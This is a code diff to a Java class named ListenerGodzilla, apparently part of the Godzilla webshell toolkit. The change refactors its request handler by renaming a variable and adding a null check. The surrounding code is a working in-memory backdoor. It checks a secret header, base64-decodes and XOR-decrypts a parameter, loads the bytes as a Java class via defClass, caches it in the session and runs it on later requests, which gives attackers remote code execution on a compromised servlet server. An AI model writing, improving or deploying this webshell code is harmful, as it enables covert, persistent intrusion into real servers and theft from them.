@@ -44,27 +44,27 @@ public class ListenerGodzilla implements InvocationHandler {
 //    }
     public void run(Object sre) {
         try {
-            Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
-            if(!((String)invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+            Object request = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
+            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
+            if(lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
-            Object session = invokeMethod(httpServletRequest, "getSession", new Class[]{}, new Object[]{});
 
-            Object response = getResponse(httpServletRequest);
-
-            String p = (String) invokeMethod(httpServletRequest, "getParameter", new Class[]{String.class}, new Object[]{pass});
+            Object session = invokeMethod(request, "getSession", new Class[]{}, new Object[]{});
+            Object response = getResponse(request);
+            String p = (String) invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{pass});
             byte[] data = base64Decode(p);
             data = x(data, false);
             Object payload = invokeMethod(session, "getAttribute", new Class[]{String.class}, new Object[]{"payload"});
             if (payload == null) {
                 invokeMethod(session, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"payload", defClass(data)});
             } else {
-                invokeMethod(httpServletRequest, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"parameters", data});
+                invokeMethod(request, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"parameters", data});
                 java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                 Class cls = (Class) invokeMethod(session, "getAttribute", new Class[]{String.class}, new Object[]{"payload"});
                 Object f = cls.newInstance();
                 f.equals(arrOut);
-                f.equals(httpServletRequest);
+                f.equals(request);
                 Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
                 invokeMethod(writer, "write", new Class[]{String.class}, new Object[]{md5.substring(0, 16)});
                 f.toString();
